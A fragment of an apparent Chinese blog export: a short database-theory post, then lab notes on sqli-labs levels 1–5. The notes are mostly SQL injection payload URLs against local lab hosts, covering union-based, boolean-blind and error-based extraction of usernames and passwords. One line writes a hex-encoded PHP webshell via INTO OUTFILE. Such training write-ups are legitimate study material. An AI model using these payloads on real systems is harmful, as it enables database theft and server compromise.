\\rightarrow YX→Y.\n公理系统设 U 为属性集总体，F 是 U 上的一组函数依赖，于是有关系模式 R&lt;U,F&gt;，对 R&lt;U,F &gt; 来说有以下的推理规则：\n\nA1 自反律\nA2 增广率\nA3 传递率\n\n定义 6.13：设 F 为属性集 U 上的一组函数依赖，X、Y⊆\\subseteq⊆U，XF+={A∣X→A能由F根据Armstrong公理导出}X^+_{F}=\\{A|X \\rightarrow A 能由F根据Armstrong 公理导出\\}XF+​={A∣X→A能由F根据Armstrong公理导出}，XF+X^+_FXF+​ 称为属性集 X 关于函数依赖集 F 的闭包。\n","slug":"数据库-关系数据理论","date":"2022-06-08T13:12:23.000Z","categories_index":"数据库","tags_index":"数据库","author_index":"cCor4ng3"},{"id":"1b32940dd409c0fe09232e5ee728ee0b","title":"sqli-labs笔记","content":"测试上线使用\n注意点：PHP 要使用低版本，高版本无法安装\thttps://github.com/Audi-1/sqli-labs\n# 相关知识点\n\n\n\n\n\n\n\n\n\n信息收集知识点：\n数据库版本：version ()\t 5.7.22-0ubuntu0.16.04.1\n数据库用户：user ()\t\t root@localhost\n数据库名字：database ()\t mozhe_Discuz_StormGroup\n操作系统：@@version_compile_os\t Linux\n版本问题：5.1 以上是高版本，5 以下是低版本  （高版本和低版本的区别在于高版本有 information_schema，低版本没有）\n\n\n\n\n\n\n\n\n\n读写文件操作 (mysql 特有功能)\nload_file (): 文件读取函数\ninto outfile 或 into dumpfile：导出函数\n使用条件：secure_file_priv 为空（为空不是为 null），开启方法：在配置文件中添加\n# less 01\n\n经过测试，闭合符号为单引号，注释使用 &quot;–+&quot;\n\n\n\n但是不知道为什么在通过 order 判断字段数的时候 #注释会有问题，用–+ 注释没有问题\n\n\n\n判断出字段共有三列，判断回显位置\n\n\n\n查询数据库和当前用户名\n\n\n\n以下为 payload，依次使用即可\n\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema = \"security\"--+ #爆破表名\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),database() from information_schema.columns where table_name = \"users\" and table_schema = \"security\"--+ #爆破列名\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+ #爆破数据\n\n# less 02\n\nless 02 经测试为无引号包裹\n\n\n\n测试字段数\n\n\n\n信息收集\n\n\n\npayload\n\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=\"security\"#  #获取表名\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(column_name),user() from information_schema.columns where table_name=\"users\" and table_schema=\"security\"# #获取字段\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users# #获取数据\n\n# less 03\n\n判断闭合方式为双引号\n\n\n\n确定字段数时出现问题，发现后面有一个括号\n\n\n\n经过尝试发现 id 的闭合方法应该为’)，注意注释方法要多试几次，不知道抽什么疯，payload:   ?id=1') order by 4-+\n\n\n\n判断回显位置\n\n\n\npayload：\n\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,database(),user()--+ #信息收集\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(table_name),user() from information_schema.tables where table_schema = \"security\"--+ #查表\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(column_name),user() from information_schema.columns where table_name = \"users\" and table_schema = \"security\"--+ #获取字段名\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users--+ #数据\n\n# less 04\n\n测试注入点，发现这里还是有一个括号干扰\n\n\n\n最终发现注入点的 payload 为： http://127.0.0.1/sqli-labs/Less-4/?id=1&quot;) and 1=1--+\n\n\n\n判断字段数\n\n\n\n判断回显位置\n\n\n\npayload：\n\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,database(),user()--+ #信息收集\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=\"security\"--+ #获取表名\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(column_name),user() from information_schema.columns where table_name=\"users\" and table_schema=\"security\"--+ #获取列名\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(username),group_concat(password) from users--+ #获取数据\n\n# less 05\n# 1、布尔盲注 —— 使用 left 进行尝试\n\n利用 left 函数判断数据库版本。下面语句是判断版本的第一个字符是否是 5，发现正常返回结果，如果结果不正常是不能返回 you are in 的\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),1)=5--+\n\n\n使用 length 函数判断数据库名称的长度，发现到 8 时正常返回，说明数据库名称的长度为 8\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+\n\n\n使用 left 函数猜测数据库第一位，当试到 s 时正确显示，说明数据库名称的第一位是 s，继续测试出第二位是 e\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),1)=\"s\"--+\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)=\"se\"--+\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)>\"se\"--+ #使用ascii的值对字符进行判断\n\n# 2、报错注入\n\npayload 如下，使用 updatexml 函数\n\n#获取当前数据库名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+\n#获取当前数据库所有表名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+\n#获取当前数据库user表所有列名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1)--+\n#获取当前数据库user表所有username和password的值\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1)--+\n#下面这步写webshell\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1' into outfile 'C:/less5.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e--+\n \n\n本关为无回显注入\n\n\n\n判断闭合方式为单引号\n\n\n\n获取数据库\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select database()))))--+\n\n\n获取表名\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+\n\n\n获取字段名\n\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database()))))--+\n\n\n获取数据\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+\n#1依次加31即可\n\n","slug":"sqli-labs笔记","date":"2022-06-07T06:44:48.000Z","categories_index":"web安全","tags_index":"web安全,测试","author_index":"cCor4ng3"}]